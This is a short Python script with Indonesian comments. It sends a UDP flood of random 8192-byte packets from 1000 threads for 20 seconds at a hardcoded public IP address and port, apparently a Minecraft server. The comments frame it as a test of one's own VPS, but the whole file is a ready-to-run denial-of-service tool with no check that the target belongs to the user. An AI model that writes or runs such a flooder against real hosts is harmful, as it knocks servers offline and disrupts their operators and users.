import socket
import random
import threading
import time
import os

# Konfigurasi target
target_ip = "15.235.229.58"      # Ganti IP target VPS kamu
target_port = 25526        # Port Minecraft atau port custom
duration = 20              # Lama serangan dalam detik
packet_size = 8192         # Ukuran paket besar
threads_count = 1000       # Jumlah thread maksimum

timeout = time.time() + duration

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(packet_size)
    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (target_ip, target_port))
        except:
            pass

# Jalankan serangan
print(f"🚀 MULAI TEST BRUTAL: {target_ip}:{target_port} | {threads_count} THREAD | {packet_size} BYTE")

threads = []
for i in range(threads_count):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

# Tunggu semua thread selesai
time.sleep(duration)

print("✅ SELESAI. VPS masih hidup? 🔥")
